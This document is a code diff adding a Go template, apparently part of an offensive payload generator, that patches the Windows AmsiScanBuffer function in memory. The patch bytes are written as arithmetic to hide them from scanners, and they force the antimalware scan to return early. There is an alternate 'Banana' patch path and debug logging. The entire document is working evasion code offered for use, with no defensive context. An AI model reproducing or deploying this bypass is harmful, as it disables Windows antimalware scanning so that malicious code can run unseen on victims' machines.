@@ -1,0 +1,31 @@
+{{if eq .UseBanana "true"}}
+out_{{ .SubName }}, err_{{ .SubName }} := patchBanana_{{ .SubName }}("amsi.dll", "AmsiScanBuffer", &[]byte{0xB2 + 6, 0x52 + 5, 0x00, 0x04 + 3, 0x7E + 2, 0xc2 + 1})
+{{ if not .Debug }}
+_ = out_{{ .SubName }}
+{{end}}
+if  err_{{ .SubName }} != nil {
+    {{if .Debug}}
+	printDebug("error","There was an error patching the amsi!ScanBuffer function with Banana: %s", err_{{ .SubName }})
+    printDebug("info","Error while patching... continue")
+    {{end}}
+} else {
+    {{if .Debug}}
+    printDebug("info", out_{{ .SubName }})
+    {{end}}
+}
+{{ else }}
+out_{{ .SubName }}, err_{{ .SubName }} := patch_{{ .SubName }}("amsi.dll", "AmsiScanBuffer", &[]byte{0xB2 + 6, 0x52 + 5, 0x00, 0x04 + 3, 0x7E + 2, 0xc2 + 1})
+{{ if not .Debug }}
+_ = out_{{ .SubName }}
+{{end}}
+if  err_{{ .SubName }} != nil {
+    {{if .Debug}}
+	printDebug("error","There was an error patching the amsi!ScanBuffer function: %s", err_{{ .SubName }})
+    printDebug("info","Error while patching... continue")
+    {{end}}
+} else {
+    {{if .Debug}}
+    printDebug("info", out_{{ .SubName }})
+    {{end}}
+}
+{{ end }}
